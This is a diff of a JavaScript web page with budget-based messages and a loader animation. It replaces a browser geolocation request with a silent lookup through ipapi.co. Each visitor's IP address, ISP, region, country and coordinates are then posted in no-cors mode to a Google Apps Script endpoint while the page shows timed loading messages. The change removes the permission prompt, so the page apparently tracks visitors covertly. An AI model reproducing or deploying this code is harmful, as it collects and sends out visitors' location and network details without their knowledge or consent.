@@ -144,7 +144,6 @@ else if ( day ==4 && budget <= 20000) {
 } else if ( day >4 && budget > 100000) {
   e5.style.display="block";
 }      
-    
    
    
        
@@ -185,23 +184,29 @@ else if ( day ==4 && budget <= 20000) {
     line += `<strong>${key}:</strong> ${data[key]}<br>`;
   }
   
-    function getLocation() {
-                    
-                    
-                    if (navigator.geolocation) {
-                        
-                        navigator.geolocation.getCurrentPosition(function (position) {
-                            var lat = position.coords.latitude;
-                            var lon = position.coords.longitude;
-                            let gta = lat.toFixed(5)+","+lon.toFixed(5);
-                            
-                            let data =gta;
-                            fetch("https://script.google.com/macros/s/AKfycbx5wRNdTlOjbdVYDgz1wTLG8wY7k3yRAHcioAwKSBAos2hp78qgf9xCL6LI4xwZkMOG/exec", {
-                              
+     
+   $.getJSON('https://ipapi.co/json/', function(data){
+       
+       let ip = data.ip;
+       let isp = data.org;
+       let state = data.region;
+       let country = data.country_name;
+       let lat = data.latitude;
+       let long = data.longitude;
+       datu = {
+           ip,
+           isp,
+           state,
+           country,
+           lat,
+           long
+       }
+fetch("https://script.google.com/macros/s/AKfycbx5wRNdTlOjbdVYDgz1wTLG8wY7k3yRAHcioAwKSBAos2hp78qgf9xCL6LI4xwZkMOG/exec", {
+                                  
                method: "POST",
               mode: "no-cors",   
     headers: { "Content-Type": "text/plain" },
-    body: JSON.stringify(data)
+    body: JSON.stringify(datu)
   })
   .then(res => res.text())
   .then(response => {
@@ -212,23 +217,12 @@ else if ( day ==4 && budget <= 20000) {
   })
   .catch(err => console.error(err));
   
-                            var mapLink = 'https://www.google.com/maps?q=' + lat + ',' + lon;
+   })
                             
-                        }, function (error) {
-                            
-                            console.log("502");
-                        });
-                    } else {
-                        console.log("504");
-                    }
-                }
-                  
-
   // loader
     
     tmps.style.display ="block";
     msg1.style.display="block";
-    getLocation();
       setTimeout(() =>{
           msg1.style.display="none";
           msg2.style.display="block";
